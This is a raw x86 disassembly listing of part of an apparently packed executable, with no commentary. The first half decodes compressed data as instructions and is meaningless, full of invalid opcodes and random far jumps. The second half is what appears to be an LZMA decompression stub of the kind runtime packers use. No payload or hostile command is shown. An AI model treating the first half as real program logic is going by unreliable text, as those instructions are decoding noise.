  44c621:	data16 repz (bad) [ecx]
  44c625:	mov    bh,0x42
  44c627:	sahf   
  44c628:	in     al,dx
  44c629:	add    ch,BYTE PTR [ecx+0x2d]
  44c62c:	cmp    BYTE PTR [edi+ebp*8],bh
  44c62f:	hlt    
  44c630:	bswap  eax
  44c632:	sbb    edx,DWORD PTR [ebp+0x59cf63db]
  44c638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c639:	lea    esi,[edx+0x61900cec]
  44c63f:	fimul  DWORD PTR ds:0x6fd745c
  44c645:	or     DWORD PTR [ebx],edx
  44c647:	jb     0x44c621
  44c649:	dec    edx
  44c64a:	push   esp
  44c64b:	sub    DWORD PTR [ecx],ecx
  44c64d:	adc    BYTE PTR [edx+0x44],dl
  44c650:	dec    esi
  44c651:	pop    es
  44c652:	in     al,dx
  44c653:	imul   edi,ebp,0xc6d4f921
  44c659:	mov    ah,0x79
  44c65b:	fiadd  DWORD PTR [ebx+0x16]
  44c65e:	les    eax,FWORD PTR [ecx+ecx*2]
  44c661:	js     0x44c620
  44c663:	cmp    ah,dh
  44c665:	add    DWORD PTR [ebx-0x51],edi
  44c668:	pop    edx
  44c669:	not    BYTE PTR [eax+0x434132fe]
  44c66f:	dec    ebp
  44c670:	lods   eax,DWORD PTR ds:[esi]
  44c671:	pop    ds
  44c672:	arpl   WORD PTR [ecx+0xa34d87a],ax
  44c678:	in     eax,0xb3
  44c67a:	and    al,0x16
  44c67c:	enter  0x10e9,0x92
  44c680:	rol    BYTE PTR [edx],1
  44c682:	fcomip st,st(1)
  44c684:	cmp    DWORD PTR [ebx],0x22
  44c687:	sub    eax,0xdbaf86ee
  44c68c:	or     DWORD PTR [esi+0x264569a5],esi
  44c692:	pop    ss
  44c693:	loop   0x44c714
  44c695:	cmp    esp,esi
  44c697:	jp     0x44c6e5
  44c699:	fdivr  QWORD PTR [eax+0x3e]
  44c69c:	dec    esp
  44c69d:	gs sbb al,0xf2
  44c6a0:	add    dh,bl
  44c6a2:	mov    esp,0x1b89680b
  44c6a7:	mov    cl,0xb4
  44c6a9:	mov    ds:0x95f3a006,al
  44c6ae:	pop    eax
  44c6af:	into   
  44c6b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c6b1:	aas    
  44c6b2:	jle    0x44c68b
  44c6b4:	or     ah,BYTE PTR [eax-0x1c]
  44c6b7:	jp     0x44c6c4
  44c6b9:	test   DWORD PTR [ebx+0x1f],esi
  44c6bc:	mov    eax,ds:0x691dbf6b
  44c6c1:	push   esp
  44c6c2:	retf   
  44c6c3:	push   ds
  44c6c4:	adc    DWORD PTR [edi-0x343ae150],ebp
  44c6ca:	hlt    
  44c6cb:	faddp  st(1),st
  44c6cd:	loopne 0x44c67d
  44c6cf:	xchg   edi,eax
  44c6d0:	xchg   ebx,eax
  44c6d1:	fsub   st(0),st
  44c6d3:	and    eax,0xb920bec6
  44c6d8:	inc    edi
  44c6d9:	push   ecx
  44c6da:	aad    0x31
  44c6dc:	push   edi
  44c6dd:	addr16 dec ecx
  44c6df:	xlat   BYTE PTR ds:[ebx]
  44c6e0:	loopne 0x44c67f
  44c6e2:	rcl    ah,0xa6
  44c6e5:	in     eax,0x76
  44c6e7:	jecxz  0x44c6f1
  44c6e9:	in     eax,dx
  44c6ea:	ds pop eax
  44c6ec:	push   eax
  44c6ed:	pop    ebp
  44c6ee:	or     eax,0xc3e43cf1
  44c6f3:	aad    0x29
  44c6f5:	ja     0x44c6ad
  44c6f7:	mov    al,0x51
  44c6f9:	mov    edi,0xe2e8e1d4
  44c6fe:	mov    al,0xa0
  44c700:	add    edx,esp
  44c702:	mov    ebp,0x6587d95c
  44c707:	arpl   WORD PTR [eax+0x70],sp
  44c70a:	cwde   
  44c70b:	xchg   edi,eax
  44c70c:	sbb    eax,0x8a2eb1af
  44c711:	add    DWORD PTR [ebx+eax*8-0x16ccc588],edx
  44c718:	mov    esp,0x80a01962
  44c71d:	mov    WORD PTR [ecx+0x511557de],ds
  44c723:	cdq    
  44c724:	push   esp
  44c725:	cmp    BYTE PTR [ebp+0x66df5387],cl
  44c72b:	fisubr DWORD PTR [ebx-0x56980d9b]
  44c731:	push   es
  44c732:	dec    esp
  44c733:	and    BYTE PTR [edi*8-0x752edf29],dl
  44c73a:	outs   dx,DWORD PTR ds:[esi]
  44c73b:	stos   DWORD PTR es:[edi],eax
  44c73c:	xor    al,0x6a
  44c73e:	or     al,0x7a
  44c740:	pop    ecx
  44c741:	sub    DWORD PTR ds:[esi-0x62],ecx
  44c745:	pop    es
  44c746:	inc    ecx
  44c747:	jb     0x44c6ca
  44c749:	cld    
  44c74a:	jne    0x44c705
  44c74c:	push   ds
  44c74d:	mov    fs,esi
  44c74f:	mov    bh,0xd
  44c751:	xor    al,0xe5
  44c753:	adc    BYTE PTR [esi],bh
  44c755:	inc    ecx
  44c756:	lea    esi,ds:0x9d0c04bd
  44c75c:	sahf   
  44c75d:	mov    cs,WORD PTR [eax+0x67]
  44c760:	jmp    eax
  44c762:	int3   
  44c763:	adc    ebp,ebp
  44c765:	call   0x9912:0xbc39586
  44c76c:	and    DWORD PTR [bx+di],edx
  44c76f:	test   al,0xd0
  44c771:	jmp    0x44c7ea
  44c773:	adc    eax,0xcf7689e1
  44c778:	mov    BYTE PTR [ebp+0x24],dh
  44c77b:	stc    
  44c77c:	sub    DWORD PTR [edx],eax
  44c77e:	lods   al,BYTE PTR ds:[esi]
  44c77f:	test   BYTE PTR [edx+ebp*8-0xe],bl
  44c783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c784:	mov    esp,esi
  44c786:	or     al,0x54
  44c788:	mov    ds:0x70e29475,eax
  44c78d:	mov    al,0xdd
  44c78f:	scas   eax,DWORD PTR es:[edi]
  44c790:	inc    eax
  44c791:	mov    al,0xf4
  44c793:	and    eax,DWORD PTR [ebx+0x58327620]
  44c799:	mov    DWORD PTR ds:[edx],edi
  44c79c:	aad    0x83
  44c79e:	mov    BYTE PTR [ebx-0x8],dh
  44c7a1:	xchg   ebp,eax
  44c7a2:	add    eax,0x43bc58e7
  44c7a7:	rcl    BYTE PTR [edi-0x7b8aa1c6],cl
  44c7ad:	cmp    dl,BYTE PTR [esp+ebx*4+0x6be1f60c]
  44c7b4:	sbb    DWORD PTR [eax+ebp*2-0x3a7cf539],ecx
  44c7bb:	cmp    BYTE PTR [edx],ch
  44c7bd:	jb     0x44c74b
  44c7bf:	mov    DWORD PTR [ebx-0x227d4120],esi
  44c7c5:	mov    bl,0x5
  44c7c7:	call   0xc916:0xadd5c12d
  44c7ce:	loope  0x44c7c4
  44c7d0:	push   ebp
  44c7d1:	dec    ebx
  44c7d2:	mov    bl,0xac
  44c7d4:	sbb    al,0xcd
  44c7d6:	daa    
  44c7d7:	cld    
  44c7d8:	push   cs
  44c7d9:	mov    esp,0x3111dbb3
  44c7de:	inc    ebx
  44c7df:	push   ss
  44c7e0:	inc    ebp
  44c7e1:	fild   QWORD PTR [edx]
  44c7e3:	pusha  
  44c7e4:	sub    DWORD PTR [ebx+0x20],0xffffffdc
  44c7e8:	mov    ?,ecx
  44c7ea:	cdq    
  44c7eb:	sub    eax,0x8f26cf2d
  44c7f0:	nop
  44c7f1:	sti    
  44c7f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44c7f3:	xor    bl,al
  44c7f5:	add    edi,DWORD PTR [bp+0x220f]
  44c7fa:	push   edi
  44c7fb:	and    dh,BYTE PTR [edx]
  44c7fd:	rol    DWORD PTR [esi],cl
  44c7ff:	jmp    0x8d49:0x99111808
  44c806:	push   0xffffffaf
  44c808:	push   ds
  44c809:	bnd jge 0x44c7ac
  44c80c:	push   ebx
  44c80d:	mov    al,ds:0xb8775529
  44c812:	dec    ecx
  44c813:	aas    
  44c814:	jae    0x44c7f3
  44c816:	adc    al,BYTE PTR [edi+0xdc941d9]
  44c81c:	call   0xfcc5:0x9970404f
  44c823:	mov    ch,0xdc
  44c825:	mov    dl,0xbf
  44c827:	push   ecx
  44c828:	leave  
  44c829:	adc    BYTE PTR [bp+di+0x24f4],bl
  44c82e:	test   eax,esi
  44c830:	cmp    esi,DWORD PTR [eax-0x1e91f8e1]
  44c836:	test   eax,0x7e59254d
  44c83b:	jmp    0xf2977191
  44c840:	ds xchg esp,eax
  44c842:	sar    DWORD PTR [ecx],cl
  44c844:	lahf   
  44c845:	cmp    al,0x2e
  44c847:	sbb    dh,BYTE PTR [esi-0x25]
  44c84a:	in     eax,0x1
  44c84c:	rol    ebx,0x8
  44c84f:	mov    ah,0x56
  44c851:	jae    0x44c806
  44c853:	cmc    
  44c854:	not    DWORD PTR ds:0x468c32ff
  44c85a:	dec    ebx
  44c85b:	stos   DWORD PTR es:[edi],eax
  44c85c:	sbb    eax,0xd9a0e22b
  44c861:	jmp    DWORD PTR [eax-0x7d]
  44c864:	idiv   BYTE PTR [esi+0x66]
  44c867:	bound  ebp,QWORD PTR [ebp+0x48]
  44c86a:	fs aas 
  44c86c:	std    
  44c86d:	out    dx,eax
  44c86e:	popa   
  44c86f:	add    dh,dl
  44c871:	repz js 0x44c897
  44c874:	push   cs
  44c875:	fisubr WORD PTR [edx-0x30]
  44c878:	aad    0xfd
  44c87a:	adc    al,0x3d
  44c87c:	jl     0x44c8c9
  44c87e:	and    DWORD PTR [edx],ecx
  44c880:	sub    edx,eax
  44c882:	xor    DWORD PTR [esi-0x25b717ef],ebp
  44c888:	xchg   ebp,eax
  44c889:	stos   BYTE PTR es:[edi],al
  44c88a:	mov    eax,DWORD PTR ds:0xf6b8396c
  44c890:	das    
  44c891:	retf   0x517a
  44c894:	test   ebp,edx
  44c896:	fadd   QWORD PTR [esi+edi*8+0xd3cea4b]
  44c89d:	push   edi
  44c89e:	call   0xf8aa87c
  44c8a3:	and    al,0x16
  44c8a5:	add    BYTE PTR [ebx-0x208cdf7c],dh
  44c8ab:	and    eax,0x354917cb
  44c8b0:	mov    ds:0xbe9dd87,eax
  44c8b5:	stos   BYTE PTR es:[edi],al
  44c8b6:	dec    esi
  44c8b7:	daa    
  44c8b8:	mov    ah,0x9
  44c8ba:	stc    
  44c8bb:	mov    eax,ds:0x51a27fe8
  44c8c0:	popf   
  44c8c1:	adc    BYTE PTR [ebx-0x44],ch
  44c8c4:	sbb    eax,0x4fabdc90
  44c8c9:	int3   
  44c8ca:	fwait
  44c8cb:	push   cs
  44c8cc:	sbb    DWORD PTR [esi+ecx*4],esp
  44c8cf:	dec    ecx
  44c8d0:	push   ecx
  44c8d1:	mov    ah,0x4a
  44c8d3:	xor    bl,BYTE PTR [ebx]
  44c8d5:	(bad)  
  44c8d6:	sbb    edx,DWORD PTR [ebp-0x7f]
  44c8d9:	mov    ah,BYTE PTR cs:[edx+esi*1-0x4e]
  44c8de:	scas   al,BYTE PTR es:[edi]
  44c8df:	cmp    eax,0x198636f1
  44c8e4:	mov    cl,0x5a
  44c8e6:	xrstors [ecx+0x47]
  44c8ea:	adc    al,0x32
  44c8ec:	dec    eax
  44c8ed:	xor    cl,BYTE PTR [ebp+0x6cd8e7b1]
  44c8f3:	aad    0xad
  44c8f5:	mov    cl,dh
  44c8f7:	dec    ebx
  44c8f8:	push   ss
  44c8f9:	jle    0x44c967
  44c8fb:	xlat   BYTE PTR ds:[ebx]
  44c8fc:	sub    bh,0x12
  44c8ff:	lea    ebp,[edi+0x5dfcecca]
  44c905:	es push ss
  44c907:	jnp    0x44c920
  44c909:	(bad)  
  44c90a:	mov    dl,0x2d
  44c90c:	mov    esp,0xee58cb9d
  44c911:	es das 
  44c913:	push   0xb
  44c915:	int    0x54
  44c917:	mov    al,0xc9
  44c919:	jmp    0x44c919
  44c91b:	lahf   
  44c91c:	(bad)  [edx+0x35565ddd]
  44c922:	mov    al,ds:0xb86fddc5
  44c927:	and    bh,0xe
  44c92a:	int    0x2e
  44c92c:	inc    ebp
  44c92d:	or     eax,eax
  44c92f:	sbb    al,0xf6
  44c931:	std    
  44c932:	cdq    
  44c933:	loopne 0x44c8f7
  44c935:	jp     0x44c8ee
  44c937:	xchg   ebx,eax
  44c938:	sbb    DWORD PTR [edx-0x59],eax
  44c93b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44c93c:	pop    edi
  44c93d:	mov    edi,0xc2344828
  44c942:	and    BYTE PTR [ecx+0x27],0x57
  44c946:	adc    al,dh
  44c948:	xchg   ebp,eax
  44c949:	pop    ebx
  44c94a:	cmp    edx,ecx
  44c94c:	arpl   bx,ax
  44c94e:	push   0x2b
  44c950:	outs   dx,DWORD PTR ds:[esi]
  44c951:	sub    DWORD PTR [esi],ebx
  44c953:	in     al,dx
  44c954:	and    BYTE PTR [esi-0x3bf64ed0],ah
  44c95a:	dec    edx
  44c95b:	pop    edi
  44c95c:	pop    ds
  44c95d:	jae    0x44c99e
  44c95f:	dec    edx
  44c960:	shl    DWORD PTR ds:0xce0bc468,1
  44c966:	mov    BYTE PTR [edx+0x247ab968],ch
  44c96c:	sub    eax,0x9bd662de
  44c971:	mov    bl,0x6
  44c973:	aaa    
  44c974:	not    dl
  44c976:	inc    ebx
  44c977:	sbb    DWORD PTR [esp+esi*4],edx
  44c97a:	out    dx,eax
  44c97b:	push   edi
  44c97c:	xchg   esi,eax
  44c97d:	mov    ecx,0x31bf527b
  44c982:	lods   al,BYTE PTR ds:[esi]
  44c983:	jo     0x44c9fe
  44c985:	xor    cl,BYTE PTR [edx-0x15]
  44c988:	mov    ebp,0x4bbc4939
  44c98d:	jae    0x44c96d
  44c98f:	imul   ecx,DWORD PTR [ebp-0x523f5ba6],0xffffffe5
  44c996:	cmp    DWORD PTR [eax],ebx
  44c998:	pop    esp
  44c999:	ds idiv edi
  44c99c:	call   FWORD PTR gs:[eax-0x73]
  44c9a0:	fimul  WORD PTR [edi+0x3cebd8c4]
  44c9a6:	das    
  44c9a7:	stos   DWORD PTR es:[edi],eax
  44c9a8:	and    al,0x93
  44c9aa:	inc    edx
  44c9ab:	sub    DWORD PTR [ebx],0xf819f22c
  44c9b1:	arpl   WORD PTR [ebp-0x44],di
  44c9b4:	(bad)  
  44c9b6:	shl    DWORD PTR [ebx-0x38a2e613],1
  44c9bc:	clc    
  44c9bd:	pop    es
  44c9be:	test   BYTE PTR [eax-0x8],ch
  44c9c1:	lahf   
  44c9c2:	call   0xb1c5:0xbf65d79e
  44c9c9:	and    al,0x76
  44c9cb:	ud1    edx,DWORD PTR [edx+eiz*2-0x6]
  44c9d0:	push   ds
  44c9d1:	add    al,BYTE PTR [edi]
  44c9d3:	ror    DWORD PTR [ecx-0x652ab7df],cl
  44c9d9:	or     ch,ah
  44c9db:	mov    esp,0x9282c895
  44c9e0:	jns    0x44c96d
  44c9e2:	(bad)  
  44c9e3:	arpl   WORD PTR [esi],di
  44c9e5:	xor    ch,BYTE PTR [ebp-0x6307439b]
  44c9eb:	xchg   DWORD PTR [eax+0x4c],edx
  44c9ee:	or     DWORD PTR [esi*4-0x47255307],eax
  44c9f5:	and    dh,dl
  44c9f7:	popf   
  44c9f8:	cwde   
  44c9f9:	call   0xffc8:0xbb85db1e
  44ca00:	and    DWORD PTR [ebp+0x417b54c9],edi
  44ca06:	xlat   BYTE PTR ds:[ebx]
  44ca07:	jge    0x44c9b7
  44ca09:	loopne 0x44c9b0
  44ca0b:	dec    ecx
  44ca0c:	or     esi,DWORD PTR [edx+ebp*4]
  44ca0f:	test   ecx,ecx
  44ca11:	stc    
  44ca12:	ss xchg ebx,eax
  44ca14:	shl    esp,cl
  44ca16:	rcl    DWORD PTR [ebx+ecx*4+0x31f7dcf8],1
  44ca1d:	mov    WORD PTR [edi],gs
  44ca1f:	add    edx,DWORD PTR [ecx+0x31]
  44ca22:	jl     0x44ca37
  44ca24:	xchg   DWORD PTR [ebx+0x4fa9a2a4],ecx
  44ca2a:	pushf  
  44ca2b:	arpl   WORD PTR [edx-0x30310666],bx
  44ca31:	test   al,0x5c
  44ca33:	iret   
  44ca34:	mov    edi,0x41b9a830
  44ca39:	xor    al,0xd5
  44ca3b:	and    eax,0x38f321e9
  44ca40:	imul   esp,DWORD PTR [edi+0x51dbdce5],0x7ad87836
  44ca4a:	mov    ?,ecx
  44ca4c:	or     eax,0xbd5d30cc
  44ca51:	mov    esi,0x84ba4621
  44ca56:	les    esp,FWORD PTR [edi+0x1b4d0b31]
  44ca5c:	loop   0x44ca1f
  44ca5e:	dec    edi
  44ca5f:	xor    ch,BYTE PTR ds:0x6657955b
  44ca65:	or     al,BYTE PTR [edx+ecx*2]
  44ca68:	div    ch
  44ca6a:	(bad)  
  44ca6b:	pop    edx
  44ca6c:	loop   0x44c9f6
  44ca6e:	repnz aas 
  44ca70:	sbb    bh,BYTE PTR [edi+edi*8]
  44ca73:	lods   al,BYTE PTR ds:[esi]
  44ca74:	pop    ss
  44ca75:	loop   0x44ca11
  44ca77:	mov    DWORD PTR [edx-0x6dd597cb],edi
  44ca7d:	into   
  44ca7e:	mov    ebp,0x92f3c2b0
  44ca83:	jl     0x44cad7
  44ca85:	int3   
  44ca86:	hlt    
  44ca87:	add    eax,0x916c842b
  44ca8c:	out    0xb4,al
  44ca8e:	mov    ah,0x6c
  44ca90:	or     al,0x8a
  44ca92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44ca93:	jne    0x44ca63
  44ca95:	jns    0x44ca3e
  44ca97:	cwde   
  44ca98:	adc    eax,0x240a38f7
  44ca9d:	dec    ecx
  44ca9e:	push   ds
  44ca9f:	test   BYTE PTR [ebp+0x6a6c3258],al
  44caa5:	push   0x7ff4f6d6
  44caaa:	mov    BYTE PTR [edx+0x72],dl
  44caad:	mov    bh,BYTE PTR [ecx]
  44caaf:	mov    bl,0x46
  44cab1:	jns    0x44cb2a
  44cab3:	xchg   ebp,eax
  44cab4:	xor    eax,0x3d0507f0
  44cab9:	jne    0x44cb21
  44cabb:	xchg   BYTE PTR [eax+0x23],dl
  44cabe:	rol    DWORD PTR [edi],1
  44cac0:	mov    ds:0x6b8a8fec,eax
  44cac5:	or     eax,0x7bf716b
  44caca:	(bad)  
  44cacb:	mov    cs,WORD PTR [edx+0x44072b8b]
  44cad1:	adc    al,BYTE PTR [ebp-0x73]
  44cad4:	inc    edx
  44cad5:	xchg   ebp,eax
  44cad6:	mov    esi,0xc8dea80b
  44cadb:	out    dx,al
  44cadc:	dec    ecx
  44cadd:	or     DWORD PTR [ebp-0x4d],ecx
  44cae0:	dec    ebp
  44cae1:	add    DWORD PTR ds:0x9c79bfe4,0x27
  44cae8:	(bad)  
  44cae9:	ja     0x44ca82
  44caeb:	mov    ds:0x5bd5fb75,al
  44caf0:	iret   
  44caf1:	xor    al,0x59
  44caf3:	or     ah,al
  44caf5:	inc    ebx
  44caf6:	rcr    BYTE PTR [ebp+0x52],0x79
  44cafa:	cmp    al,0x93
  44cafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44cafd:	ins    BYTE PTR es:[edi],dx
  44cafe:	mov    al,BYTE PTR [edi]
  44cb00:	popa   
  44cb01:	push   0xffffffd3
  44cb03:	fsub   DWORD PTR cs:[edx]
  44cb06:	mov    edi,0x1ad60490
  44cb0b:	fs jo  0x44caec
  44cb0e:	rol    DWORD PTR [ebx+0x77c52a50],cl
  44cb14:	and    dl,BYTE PTR [edx]
  44cb16:	(bad)  [eax+0x1aab4d3c]
  44cb1c:	(bad)  
  44cb1d:	adc    dl,BYTE PTR [ebx+eax*2]
  44cb20:	push   edi
  44cb21:	jne    0x44cb31
  44cb23:	in     al,dx
  44cb24:	lods   al,BYTE PTR ds:[esi]
  44cb25:	call   0x127f:0x44eb3bba
  44cb2c:	or     eax,0x6a80de2f
  44cb31:	ret    
  44cb32:	stc    
  44cb33:	jmp    0x44caf1
  44cb35:	add    BYTE PTR [esi],al
  44cb37:	cmp    eax,0xf55437a8
  44cb3c:	dec    ebx
  44cb3d:	icebp  
  44cb3e:	(bad)  
  44cb3f:	leave  
  44cb40:	aam    0x38
  44cb42:	les    ecx,FWORD PTR [ebp+0xc766]
	...
  44cb50:	pusha  
  44cb51:	mov    esi,0x429000
  44cb56:	lea    edi,[esi-0x28000]
  44cb5c:	push   edi
  44cb5d:	mov    ebp,esp
  44cb5f:	lea    ebx,[esp-0x3e80]
  44cb66:	xor    eax,eax
  44cb68:	push   eax
  44cb69:	cmp    esp,ebx
  44cb6b:	jne    0x44cb68
  44cb6d:	inc    esi
  44cb6e:	inc    esi
  44cb6f:	push   ebx
  44cb70:	push   0x4a7c3
  44cb75:	push   edi
  44cb76:	add    ebx,0x4
  44cb79:	push   ebx
  44cb7a:	push   0x23b45
  44cb7f:	push   esi
  44cb80:	add    ebx,0x4
  44cb83:	push   ebx
  44cb84:	push   eax
  44cb85:	mov    DWORD PTR [ebx],0x20003
  44cb8b:	nop
  44cb8c:	nop
  44cb8d:	nop
  44cb8e:	nop
  44cb8f:	nop
  44cb90:	push   ebp
  44cb91:	push   edi
  44cb92:	push   esi
  44cb93:	push   ebx
  44cb94:	sub    esp,0x7c
  44cb97:	mov    edx,DWORD PTR [esp+0x90]
  44cb9e:	mov    DWORD PTR [esp+0x74],0x0
  44cba6:	mov    BYTE PTR [esp+0x73],0x0
  44cbab:	mov    ebp,DWORD PTR [esp+0x9c]
  44cbb2:	lea    eax,[edx+0x4]
  44cbb5:	mov    DWORD PTR [esp+0x78],eax
  44cbb9:	mov    eax,0x1
  44cbbe:	movzx  ecx,BYTE PTR [edx+0x2]
  44cbc2:	mov    ebx,eax
  44cbc4:	shl    ebx,cl
  44cbc6:	mov    ecx,ebx
  44cbc8:	dec    ecx
  44cbc9:	mov    DWORD PTR [esp+0x6c],ecx
  44cbcd:	movzx  ecx,BYTE PTR [edx+0x1]
  44cbd1:	shl    eax,cl
  44cbd3:	dec    eax
  44cbd4:	mov    DWORD PTR [esp+0x68],eax
  44cbd8:	mov    eax,DWORD PTR [esp+0xa8]
  44cbdf:	movzx  esi,BYTE PTR [edx]
  44cbe2:	mov    DWORD PTR [ebp+0x0],0x0
  44cbe9:	mov    DWORD PTR [esp+0x60],0x0
  44cbf1:	mov    DWORD PTR [eax],0x0
  44cbf7:	mov    eax,0x300
  44cbfc:	mov    DWORD PTR [esp+0x64],esi
  44cc00:	mov    DWORD PTR [esp+0x5c],0x1
  44cc08:	mov    DWORD PTR [esp+0x58],0x1
  44cc10:	mov    DWORD PTR [esp+0x54],0x1
  44cc18:	mov    DWORD PTR [esp+0x50],0x1
  44cc20:	movzx  ecx,BYTE PTR [edx+0x1]
  44cc24:	add    ecx,esi
  44cc26:	shl    eax,cl
  44cc28:	lea    ecx,[eax+0x736]
  44cc2e:	cmp    DWORD PTR [esp+0x74],ecx
  44cc32:	jae    0x44cc42
  44cc34:	mov    eax,DWORD PTR [esp+0x78]
  44cc38:	mov    WORD PTR [eax],0x400
  44cc3d:	add    eax,0x2
  44cc40:	loop   0x44cc38
  44cc42:	mov    ebx,DWORD PTR [esp+0x94]
  44cc49:	xor    edi,edi
  44cc4b:	mov    DWORD PTR [esp+0x48],0xffffffff
  44cc53:	mov    edx,ebx
  44cc55:	add    edx,DWORD PTR [esp+0x98]
  44cc5c:	mov    DWORD PTR [esp+0x4c],edx
  44cc60:	xor    edx,edx
  44cc62:	cmp    ebx,DWORD PTR [esp+0x4c]
  44cc66:	je     0x44d5e8
  44cc6c:	movzx  eax,BYTE PTR [ebx]
  44cc6f:	shl    edi,0x8
  44cc72:	inc    edx
  44cc73:	inc    ebx
  44cc74:	or     edi,eax
  44cc76:	cmp    edx,0x4
  44cc79:	jle    0x44cc62
  44cc7b:	mov    ecx,DWORD PTR [esp+0xa4]
  44cc82:	cmp    DWORD PTR [esp+0x74],ecx
  44cc86:	jae    0x44d5f0
  44cc8c:	mov    esi,DWORD PTR [esp+0x74]
  44cc90:	and    esi,DWORD PTR [esp+0x6c]
  44cc94:	mov    eax,DWORD PTR [esp+0x60]
  44cc98:	mov    edx,DWORD PTR [esp+0x78]
  44cc9c:	shl    eax,0x4
  44cc9f:	mov    DWORD PTR [esp+0x44],esi
  44cca3:	add    eax,esi
  44cca5:	cmp    DWORD PTR [esp+0x48],0xffffff
  44ccad:	lea    ebp,[edx+eax*2]
  44ccb0:	ja     0x44ccca
  44ccb2:	cmp    ebx,DWORD PTR [esp+0x4c]
  44ccb6:	je     0x44d5e8
  44ccbc:	shl    DWORD PTR [esp+0x48],0x8
  44ccc1:	movzx  eax,BYTE PTR [ebx]
  44ccc4:	shl    edi,0x8
  44ccc7:	inc    ebx
  44ccc8:	or     edi,eax
  44ccca:	mov    eax,DWORD PTR [esp+0x48]
  44ccce:	mov    dx,WORD PTR [ebp+0x0]
  44ccd2:	shr    eax,0xb
  44ccd5:	movzx  ecx,dx
  44ccd8:	imul   eax,ecx
  44ccdb:	cmp    edi,eax
  44ccdd:	jae    0x44cec0
  44cce3:	mov    DWORD PTR [esp+0x48],eax
  44cce7:	mov    eax,0x800
  44ccec:	sub    eax,ecx
  44ccee:	mov    cl,BYTE PTR [esp+0x64]
  44ccf2:	sar    eax,0x5
  44ccf5:	mov    esi,0x1
  44ccfa:	lea    eax,[edx+eax*1]
  44ccfd:	movzx  edx,BYTE PTR [esp+0x73]
  44cd02:	mov    WORD PTR [ebp+0x0],ax
  44cd06:	mov    eax,DWORD PTR [esp+0x74]
  44cd0a:	and    eax,DWORD PTR [esp+0x68]
  44cd0e:	mov    ebp,DWORD PTR [esp+0x78]
  44cd12:	shl    eax,cl
  44cd14:	mov    ecx,0x8
  44cd19:	sub    ecx,DWORD PTR [esp+0x64]
  44cd1d:	sar    edx,cl
  44cd1f:	add    eax,edx
  44cd21:	imul   eax,eax,0x600
  44cd27:	cmp    DWORD PTR [esp+0x60],0x6
  44cd2c:	lea    eax,[ebp+eax*1+0xe6c]
  44cd33:	mov    DWORD PTR [esp+0x14],eax
  44cd37:	jle    0x44ce07
  44cd3d:	mov    eax,DWORD PTR [esp+0x74]
  44cd41:	sub    eax,DWORD PTR [esp+0x5c]
  44cd45:	mov    edx,DWORD PTR [esp+0xa0]
  44cd4c:	movzx  eax,BYTE PTR [edx+eax*1]
  44cd50:	mov    DWORD PTR [esp+0x40],eax
  44cd54:	shl    DWORD PTR [esp+0x40],1
  44cd58:	mov    ecx,DWORD PTR [esp+0x40]
  44cd5c:	lea    edx,[esi+esi*1]
  44cd5f:	mov    ebp,DWORD PTR [esp+0x14]
  44cd63:	and    ecx,0x100
  44cd69:	cmp    DWORD PTR [esp+0x48],0xffffff
  44cd71:	lea    eax,[ebp+ecx*2+0x0]
  44cd75:	mov    DWORD PTR [esp+0x3c],ecx
  44cd79:	lea    ebp,[eax+edx*1]
  44cd7c:	ja     0x44cd96
  44cd7e:	cmp    ebx,DWORD PTR [esp+0x4c]
  44cd82:	je     0x44d5e8
  44cd88:	shl    DWORD PTR [esp+0x48],0x8
  44cd8d:	movzx  eax,BYTE PTR [ebx]
  44cd90:	shl    edi,0x8
  44cd93:	inc    ebx
  44cd94:	or     edi,eax
  44cd96:	mov    eax,DWORD PTR [esp+0x48]
  44cd9a:	mov    cx,WORD PTR [ebp+0x200]
  44cda1:	shr    eax,0xb
  44cda4:	movzx  esi,cx
  44cda7:	imul   eax,esi
  44cdaa:	cmp    edi,eax
  44cdac:	jae    0x44cdd1
  44cdae:	mov    DWORD PTR [esp+0x48],eax
  44cdb2:	mov    eax,0x800
  44cdb7:	sub    eax,esi
  44cdb9:	mov    esi,edx
  44cdbb:	sar    eax,0x5
  44cdbe:	cmp    DWORD PTR [esp+0x3c],0x0
  44cdc3:	lea    eax,[ecx+eax*1]
  44cdc6:	mov    WORD PTR [ebp+0x200],ax
  44cdcd:	je     0x44cdf1
  44cdcf:	jmp    0x44cdff
  44cdd1:	sub    DWORD PTR [esp+0x48],eax
  44cdd5:	sub    edi,eax
  44cdd7:	mov    eax,ecx
  44cdd9:	lea    esi,[edx+0x1]
  44cddc:	shr    ax,0x5
  44cde0:	sub    cx,ax
  44cde3:	cmp    DWORD PTR [esp+0x3c],0x0
  44cde8:	mov    WORD PTR [ebp+0x200],cx
  44cdef:	je     0x44cdff
  44cdf1:	cmp    esi,0xff
  44cdf7:	jle    0x44cd54
  44cdfd:	jmp    0x44ce78
  44cdff:	cmp    esi,0xff
  44ce05:	jg     0x44ce78
  44ce07:	lea    edx,[esi+esi*1]
  44ce0a:	mov    ebp,DWORD PTR [esp+0x14]
  44ce0e:	add    ebp,edx
  44ce10:	cmp    DWORD PTR [esp+0x48],0xffffff
  44ce18:	ja     0x44ce32
  44ce1a:	cmp    ebx,DWORD PTR [esp+0x4c]
  44ce1e:	je     0x44d5e8
  44ce24:	shl    DWORD PTR [esp+0x48],0x8
  44ce29:	movzx  eax,BYTE PTR [ebx]
  44ce2c:	shl    edi,0x8
  44ce2f:	inc    ebx
  44ce30:	or     edi,eax
  44ce32:	mov    eax,DWORD PTR [esp+0x48]
  44ce36:	mov    cx,WORD PTR [ebp+0x0]
  44ce3a:	shr    eax,0xb
  44ce3d:	movzx  esi,cx
  44ce40:	imul   eax,esi
  44ce43:	cmp    edi,eax
  44ce45:	jae    0x44ce60
  44ce47:	mov    DWORD PTR [esp+0x48],eax
  44ce4b:	mov    eax,0x800
  44ce50:	sub    eax,esi
  44ce52:	mov    esi,edx
  44ce54:	sar    eax,0x5
  44ce57:	lea    eax,[ecx+eax*1]
  44ce5a:	mov    WORD PTR [ebp+0x0],ax
  44ce5e:	jmp    0x44cdff
  44ce60:	sub    DWORD PTR [esp+0x48],eax
  44ce64:	sub    edi,eax
  44ce66:	mov    eax,ecx
  44ce68:	lea    esi,[edx+0x1]
  44ce6b:	shr    ax,0x5
  44ce6f:	sub    cx,ax
